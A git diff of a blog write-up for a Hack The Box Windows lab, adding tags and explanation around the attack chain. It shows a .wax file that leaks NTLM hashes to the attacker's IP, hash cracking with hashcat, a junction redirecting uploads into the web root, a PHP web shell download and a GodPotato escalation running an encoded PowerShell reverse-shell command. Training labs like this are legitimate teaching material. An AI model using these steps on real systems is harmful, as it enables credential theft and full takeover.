@@ -8,7 +8,12 @@ tags:
   - blog
   - HTB
   - windows
-lastmod: 2026-04-26T07:12:51.451Z
+  - OWASP-fileupload-windows-media-player-wax
+  - Decode-NTLMv2-hashcat
+  - Source-Code-Review-xampp-index-file-compare-RCE
+  - Windows-Privilege-enable-all-privilege
+  - Windows-Privilege-SeImpersonatePrivilege
+lastmod: 2026-05-07T05:59:41.365Z
 ---
 # Box Info
 
@@ -18,9 +23,7 @@ lastmod: 2026-04-26T07:12:51.451Z
 
 # Recon
 
-### \[\[PORT & IP SCAN]]
-
-The `nmap` reveal that the machine is ((change it) a standard Windows AD Server , with the kerberos auth , also the ldap query , and the 3389 port show that the domain `AWSJPDC0522.shibuya.vl` ,but the ldap anonymous inquiry failed .)
+### PORT & IP SCAN
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -180,12 +183,22 @@ by Ben "epi" Risher 🤓                 ver: 2.13.1
 
 Nothing interesting here.
 
-The file upload seems like the most likely point of attack. In searching for ways to attack Windows Media Player, I’ll find an article from Morphisec, “[NTLM Privilege Escalation: The Unpatched Microsoft Vulnerabilities No One is Talking About](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)”. It has five examples, and the forth is about `.wax` files, which are audio shortcuts for Windows Media Player. When opened with Windows Media Player, these will try to fetch a media stream from a server defined in the file, authenticating with their NTLM hash if necessary.
+### responder
 
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "OWASP-fileupload-windows-media-player-wax" >}} The file upload seems like the most likely point of attack. In searching for ways to attack Windows Media Player, I’ll find an article from Morphisec, . It has five examples, and the forth is about `.wax` files, which are audio shortcuts for Windows Media Player. When opened with Windows Media Player, these will try to fetch a media stream from a server defined in the file, authenticating with their NTLM hash if necessary.
+
+{{< /toggle >}}
+
+Ref : [NTLM Privilege Escalation: The Unpatched Microsoft Vulnerabilities No One is Talking About](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)”.\
 The article above has an example file which I’ll copy. It’s simple XML:\
-`voicemail.wax`\
+`voicemail.wax`
+
 {{< code >}}\ <asx version="3.0">\ <title>Leak</title>\ <entry>\ <title></title>\ <ref href="file://10.10.16.39\test\0xdf.mp3"/>\ </entry>\ </asx>\
 {{< /code >}}
+
+I’ll fire up [Responder](https://github.com/lgandx/Responder) with `sudo uv run --script Responder.py` (after adding `inetfaces` package to the inline metadata if I hadn’t before with `uv add --script Responder.py netifaces`; see my [uv cheatsheet](https://0xdf.gitlab.io/cheatsheets/uv#) for details). About a minute after I upload the `.wax` file, there’s a hit:
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -273,7 +286,13 @@ The article above has an example file which I’ll copy. It’s simple XML:\
 
 ```
 
-I’ll save the hash to a file, and pass it to `hashcat`, which detects the mode and cracks it with `rockyou.txt` in a few seconds:
+### hashcat
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Decode-NTLMv2-hashcat" >}} I’ll save the hash to a file, and pass it to `hashcat`, which detects the mode and cracks it with `rockyou.txt` in a few seconds:
+
+{{< /toggle >}}
 
 ```
 $ hashcat enox.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
@@ -321,7 +340,13 @@ PS C:\Users>
 
 ```
 
-xampp is the web hosting server
+### xampp
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Source-Code-Review-xampp-index-file-compare-RCE" >}} By reviewing the `index.php` source code, we identified the logic handling file uploads. The application calculates the destination folder name by generating an MD5 hash of three concatenated user inputs: First Name, Last Name, and Email.When there’s an upload, it creates the MD5 folder name I previous observed using a combination of the first name, last name, and email:If we control these inputs, we can perfectly predict the exact directory name where our uploaded files will be stored (in this case, `4e422e23b6f3750cea2a3f773517e883`).This essentially creates a tunnel. Whenever the application attempts to read from or write to `C:\Windows\Tasks\Uploads\4e422e23b6f3750cea2a3f773517e883`, Windows transparently redirects the operation to `C:\xampp\htdocs`.
+
+{{< /toggle >}}
 
 ```
 PS C:\xampp> dir
@@ -371,11 +396,21 @@ d-----         10/2/2023  11:03 AM                webdav
 
 `index.php` is large, but most of it is static HTML. The PHP that handles the uploads is at the top:
 
+By reviewing the `index.php` source code, we identified the logic handling file uploads. The application calculates the destination folder name by generating an MD5 hash of three concatenated user inputs: First Name, Last Name, and Email.
+
 When there’s an upload, it creates the MD5 folder name I previous observed using a combination of the first name, last name, and email:
+
+If we control these inputs, we can perfectly predict the exact directory name where our uploaded files will be stored (in this case, `4e422e23b6f3750cea2a3f773517e883`).
 
 {{< code >}}\
 $folderName = md5($firstname . $lastname . $email);\
 {{< /code >}}
+
+While we can upload files, the application stores them in `C:\windows\tasks\Uploads\<MD5_Hash>\`. This location poses a significant problem: it is outside the XAMPP web root (`C:\xampp\htdocs\`). Even if we upload a malicious PHP web shell, the Apache server cannot serve or execute it from the `Tasks` directory. We need a way to force the application to drop the file into the web root.
+
+We map the predicted MD5 upload folder directly to the XAMPP web root:
+
+This essentially creates a tunnel. Whenever the application attempts to read from or write to `C:\Windows\Tasks\Uploads\4e422e23b6f3750cea2a3f773517e883`, Windows transparently redirects the operation to `C:\xampp\htdocs`.
 
 ```
 PS C:\windows\tasks\Uploads> cmd /c mklink /J C:\Windows\Tasks\Uploads\4e422e23b6f3750cea2a3f773517e883 C:\xampp\htdocs
@@ -397,6 +432,8 @@ d-----         10/2/2023  10:27 AM                js
 PS C:\windows\tasks\Uploads>
 ```
 
+With the junction point established, we prepare our payload. We download `p0wny-shell` (an interactive PHP web shell) to our attack machine.
+
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
 └─$ wget https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
@@ -413,6 +450,8 @@ shell.php                    100%[=============================================>
 2026-04-26 01:05:23 (3.21 MB/s) - ‘shell.php’ saved [20321/20321]
 
 ```
+
+Because of the directory junction, Windows intercepts the save operation and drops `shell.php` and `revshell.php` straight into the web root directory instead.
 
 ![Pasted image 20260426005917.png](/ob/Pasted%20image%2020260426005917.png)
 
@@ -468,7 +507,15 @@ SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
 SeTimeZonePrivilege           Change the time zone                Disabled
 ```
 
-There’s a nice tool, [FullPowers](https://github.com/itm4n/FullPowers), designed to restore the default privilege set for the account by creating a scheduled task and running it. I’ll download a copy from the [release page](https://github.com/itm4n/FullPowers/releases/) and upload it to Media using `scp`:
+### FullPowers
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Windows-Privilege-enable-all-privilege" >}} FullPowers designed to restore the default privilege set for the account by creating a scheduled task and running it. I’ll download a copy from the release page and upload it to Media using `scp`:
+
+{{< /toggle >}}
+
+Ref: ,[FullPowers](https://github.com/itm4n/FullPowers)
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -539,7 +586,15 @@ SeIncreaseWorkingSetPrivilege Increase a process working set            Enabled
 
 ```
 
-To exploit `SeImpersonatePrivilege`, I’ll use [GodPotato](https://github.com/BeichenDream/GodPotato). I’ll download the latest release and upload it to Media:
+### GodPotato
+
+{{< toggle "Tag 🏷️" >}}
+
+{{< tag "Windows-Privilege-SeImpersonatePrivilege" >}} To SeImpersonatePrivilege, I’ll use GodPotato. I’ll download the latest release and upload it to Media:
+
+{{< /toggle >}}
+
+Ref : \[GodPotato]\(https://github.com/BeichenDream/GodPotato
 
 ```
 ┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
@@ -588,5 +643,4 @@ PS C:\programdata> .\GodPotato-NET4.exe -cmd "powershell -e JABjAGwAaQBlAG4AdAAg
 ```
 PS C:\Users\Administrator\Desktop> type root.txt
 2c983458e089c0926c11293501d7fe74
-
 ```
